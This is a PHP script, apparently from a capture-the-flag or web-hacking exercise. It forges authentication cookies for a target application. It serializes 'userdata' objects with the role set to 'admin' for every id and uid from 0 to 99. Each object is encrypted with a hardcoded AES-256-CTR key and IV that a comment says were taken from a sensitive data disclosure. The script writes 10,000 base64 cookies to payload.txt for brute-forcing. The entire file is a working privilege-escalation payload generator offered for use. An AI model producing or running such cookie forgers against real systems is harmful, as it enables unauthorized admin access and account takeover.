<?php 

class userdata
{
	// Using the userdataupdate.php code obtained form sensitive data disclosure 
	public $role= "admin";
	public $id = 0; // 0-99
	public $uid = 0; // 0-99

	public function __construct($i, $uuid)
	{
		$this->id = (int) $i;
		$this->uid = (int) $uuid;
	}

}

$outputfile = 'payload.txt'; // For outputfile 

// Open and read output file

$fileHandle = fopen($outputfile, 'w');

if ($fileHandle)
{
	for ($i = 0; $i <100; $i++) // 0-99
	{
		for ($j =0; $j < 100; $j++ ) //0-99
		{
			$injected_class = new userdata($i, $j);
			$serialized_class = serialize($injected_class);

			$plaintext = 'abcdef';
			$key = "8b362e210615e66b3bf7f69f6c819056";
			$cipher = "aes-256-ctr";
			$iv = "ABCDEFGHIJKLMNOP";

			$encrypted_auth= openssl_encrypt($serialized_class, $cipher, $key, $options=0, $iv);
			$cookie = base64_encode($encrypted_auth);

			// writing to output file

			fwrite($fileHandle, $cookie. "\n");

		}
	}
	fclose($fileHandle);
	echo "[+] All Payload is saved in : $outputfile\n";


}else 
{
	echo "[-] Error!, Fail to Open : $outputfile for writing\n";
}


 ?>